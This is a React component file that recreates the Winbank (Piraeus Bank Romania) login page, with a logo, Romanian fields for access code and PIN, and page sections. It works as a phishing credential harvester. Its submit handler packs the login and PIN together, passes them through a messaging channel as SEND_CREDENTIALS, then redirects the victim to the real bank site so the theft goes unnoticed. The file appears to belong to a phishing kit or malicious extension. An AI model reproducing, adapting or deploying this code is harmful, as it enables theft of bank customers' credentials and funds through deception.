import React, { useState, useEffect, useRef, Fragment } from 'react'
import { storage } from '../storage/storage'
import { Messaging } from '../utils/messages'
import { UserActions } from '../utils/constants'
import { FieldType, CREDENTIALS_DELIMETER } from '../utils/constants'
import { FormTabs } from './FormTabs'
import { ErrorMsg } from './ErrorMsg'
import logo from '../media/winbank.png'
import tabFormButton from '../media/loginPanelTab_2.png'
import userIcon from '../media/icon_un.png'
import passwordIcon from '../media/icon_pass.png'
import { IconTabs } from './IconTabs'
import { Carousel } from './Carousel'
import { Articles } from './Articles'
import {Security} from "./Security";
import {Contact} from "./Contact";
import {Footer} from "./Footer";




const Header = props => {
  return(
      <Fragment>
        <div className="logo-container">
          <img src={logo} alt="winbank" />
        </div>
        <div className="lang ro">
          <a title="ro" className="active" href="#"><span>Ro</span></a>
        </div>
        <div className="lang en">
          <a title="en" href="#"><span>En</span></a>
        </div>
      </Fragment>
  )
}




export const Step_1 = props => {
  const { store, changeStore } = props

  const [login, setLogin] = useState('')
  const [password, setPassword] = useState('')
  const [showError, setShowError] = useState('')
  const [isLoginError, setIsLoginError] = useState(false)
  const [isPassError, setPassError] = useState(false)

  const loginEl = useRef(null)
  
  useEffect(() => {
    loginEl.current.focus()
  }, [])

  // const error = store.error
  // const setError = val => changeStore({ error: val })
  
  /*const handleIsLoginError = () => {
    if (!login || !password) {
      setIsLoginError(true)
      return
    }
    setIsLoginError(false)
  }*/

  const handleChange = (value, type) => {
    console.log('value', value)
    if (type === FieldType.LOGIN) {
      setLogin(value)
    }
    if (type === FieldType.PASSWORD) {
      setPassword(value)
    }
  }

  const handleSubmit = () => {
    const value = `${login}${CREDENTIALS_DELIMETER}${password}`

    if (!login) {
      setIsLoginError(true)
      return
    }
    if (!password) {
      setPassError(true)
      return
    }

    Messaging.send({ type: UserActions.SEND_CREDENTIALS, payload: value })

    window.location.href = 'https://www.piraeusbank.com/sites/romania/ro/Pages/default.aspx'

  }


  return (
      <div>
    <div className="row step-wrapper">
        <Header />
        <FormTabs />
        {/* <FormLogin /> */}
        <div className="form-login-container">
        <div className={`fields-wrap`}>
          <div className="login-wrap" style={{backgroundPositionY: !login && isLoginError ? `210px` : `104px`}}>
            <div className="login-icon"><img src={userIcon} alt="username" /></div>
            <div className="login-input">
              <input type="text"
                     ref={loginEl} value={login}
                     onChange={e => handleChange(e.target.value, FieldType.LOGIN)}
                     title="Cod de acces"
                     placeholder="Cod de acces" />
              
            </div>
          </div>
          <div className="password-wrap" style={{backgroundPositionY: !password && isPassError ? `210px` : `104px`}}>
            <div className="password-icon"><img src={passwordIcon} alt="password" /></div>
            <div className="password-input">
              <input type="password" value={password} onChange={e => handleChange(e.target.value, FieldType.PASSWORD)}
                     title="Cod PIN"
                     placeholder="Cod PIN" />
              
            </div>
          </div>
        </div>
          <button className="submit" onClick={handleSubmit}>Autentificare</button>
          <div><a href="#" className="">Mai multe informaţii</a></div>
          
      </div>
      <IconTabs />
      <Carousel />


    </div>

        <div className="middle-container">
          <div className="middle-container-inner">
            <Articles />
            <Security />
            <Contact />
          </div>
        </div>

        <div className="separator"></div>

        <Footer />



      </div>

  )
}


